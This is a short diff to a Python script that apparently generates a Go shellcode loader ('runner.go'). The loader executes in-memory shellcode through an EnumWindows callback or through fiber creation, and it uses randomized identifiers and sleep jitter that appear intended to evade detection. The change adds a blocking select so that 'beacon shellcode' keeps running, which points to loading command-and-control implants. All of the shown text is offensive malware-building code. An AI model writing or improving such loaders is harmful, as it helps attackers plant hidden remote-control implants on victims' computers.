@@ -146,7 +146,10 @@ def generate(output_path="runner.go"):
 \ttime.Sleep(time.Duration(rand.Intn({jitter_max})) * time.Millisecond)
 
 \t// Execute via EnumWindows callback
-\t{v['procEnum']}.Call({v['memAddr']}, 0)'''
+\t{v['procEnum']}.Call({v['memAddr']}, 0)
+
+\t// Keep alive for beacon shellcode that spawns threads
+\tselect {{}}'''
     else:  # create_fiber
         run_body = f'''\t{v['procConvert']} := {v['kDLL']}.NewProc({convert_name})
 \t{v['procFiber']} := {v['kDLL']}.NewProc({ct_name})
@@ -159,7 +162,10 @@ def generate(output_path="runner.go"):
 \t{v['threadH']}, _, _ := {v['procFiber']}.Call(0, {v['memAddr']}, 0)
 \tif {v['threadH']} != 0 {{
 \t\t{v['procSwitch']}.Call({v['threadH']})
-\t}}'''
+\t}}
+
+\t// Keep alive for beacon shellcode that spawns threads
+\tselect {{}}'''
 
     code = f'''package main
 
